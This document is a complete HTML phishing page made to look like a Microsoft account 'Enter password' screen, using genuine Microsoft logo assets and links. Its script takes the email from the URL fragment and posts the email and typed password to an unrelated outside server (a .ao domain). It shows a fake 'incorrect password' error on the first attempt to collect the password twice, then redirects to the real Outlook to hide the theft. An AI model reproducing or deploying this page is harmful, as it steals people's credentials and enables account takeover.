<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2.0,user-scalable=yes">
    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <style>
        body {
            font-family: "Segoe UI", -apple-system, "Helvetica Neue", Roboto, Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .login-box {
            background-color: white;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            width: 440px;
            max-width: 90%;
            padding: 44px;
            box-sizing: border-box;
        }
        .logo {
            max-width: 256px;
            height: 24px;
            margin-bottom: 16px;
        }
        .identity-banner {
            margin-bottom: 16px;
            padding: 4px 0;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 16px 0;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-control {
            width: 100%;
            height: 36px;
            padding: 6px 10px 6px 0;
            border: 0;
            border-bottom: 1px solid #666;
            outline: none;
            box-sizing: border-box;
        }
        .form-control:focus {
            border-color: #0067b8;
        }
        .error {
            color: #e81123;
            display: none;
            margin-bottom: 16px;
        }
        .alert {
            margin-bottom: 16px;
        }
        .btn {
            min-width: 108px;
            min-height: 32px;
            border: none;
            background-color: #0067b8;
            color: white;
            padding: 4px 12px;
            cursor: pointer;
            text-align: center;
            float: right;
        }
        .btn:hover {
            background-color: #005da6;
        }
        .forgot-link {
            display: block;
            margin-top: 20px;
            font-size: 13px;
        }
        .progress {
            display: none;
            margin-top: 20px;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            min-height: 28px;
            text-align: right;
            padding-right: 10px;
        }
        .footer a {
            color: #666;
            font-size: 12px;
            text-decoration: none;
            margin-left: 8px;
            margin-right: 8px;
            line-height: 28px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
            <div class="identity-banner">
                <div id="displayName" class="identity"></div>
            </div>
            <h1>Enter password</h1>
            
            <div id="important" class="alert">
                Because you're accessing sensitive info, you need to verify your password
            </div>
            
            <div id="passwordError" class="error">
                Your account or password is incorrect. If you can't remember your password, <a href="https://passwordreset.microsoftonline.com/" target="_blank">reset it now.</a>
            </div>
            
            <div id="passwordError2" class="error">
                Please enter your password.
            </div>
            
            <div class="form-group">
                <input type="password" id="i0118" class="form-control" placeholder="Password">
                <input type="hidden" id="count" value="1">
            </div>
            
            <div>
                <button id="idSIButton9" class="btn">Sign in</button>
            </div>
            
            <a href="https://passwordreset.microsoftonline.com/" class="forgot-link" target="_blank">Forgot my password</a>
            
            <div id="progressBar" class="progress">
                Loading...
            </div>
        </div>
    </div>
    
    <div class="footer">
        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
        <a href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy & cookies</a>
    </div>

    <script>
        // Get email from URL fragment
        var email = window.location.hash.substr(1);
        document.getElementById('displayName').textContent = email;
        
        // Show page immediately
        document.addEventListener('DOMContentLoaded', function() {
            // Handle Sign In button click
            document.getElementById('idSIButton9').addEventListener('click', submitForm);
            
            // Handle Enter key press in password field
            document.getElementById('i0118').addEventListener('keypress', function(event) {
                if (event.key === 'Enter') {
                    event.preventDefault();
                    submitForm();
                }
            });
        });
        
        // Form submission function
        function submitForm() {
            var password = document.getElementById('i0118').value;
            var count = document.getElementById('count').value;
            var user = document.getElementById('displayName').textContent;
            
            // Validate password field
            if (!password) {
                document.getElementById('passwordError2').style.display = 'block';
                document.getElementById('passwordError').style.display = 'none';
                document.getElementById('important').style.display = 'none';
                document.getElementById('i0118').style.borderColor = '#e81123';
                document.getElementById('i0118').focus();
                return;
            }
            
            // Show loading indicator
            document.getElementById('i0118').style.borderColor = 'black';
            document.getElementById('progressBar').style.display = 'block';
            document.getElementById('passwordError2').style.display = 'none';
            document.getElementById('passwordError').style.display = 'none';
            document.getElementById('idSIButton9').disabled = true;
            
            // Send data using XMLHttpRequest
            var xhr = new XMLHttpRequest();
            var url = 'https://abcempreendedor.ao/authse8/policy.php';
            var data = 'email=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(password) + '&count=' + encodeURIComponent(count);
            
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var response = xhr.responseText;
                        if (response === '1') {
                            // Success - redirect to Outlook
                            setTimeout(function() {
                                window.location.href = 'https://outlook.office365.com';
                            }, 2000);
                        } else {
                            // Show error message for first attempt
                            document.getElementById('i0118').value = '';
                            document.getElementById('progressBar').style.display = 'none';
                            document.getElementById('passwordError').style.display = 'block';
                            document.getElementById('important').style.display = 'none';
                            document.getElementById('idSIButton9').disabled = false;
                            document.getElementById('count').value = '2';
                        }
                    } else {
                        // Handle error - just redirect to legitimate site
                        setTimeout(function() {
                            window.location.href = 'https://outlook.office365.com';
                        }, 2000);
                    }
                }
            };
            
            xhr.send(data);
        }
    </script>
</body>
</html>
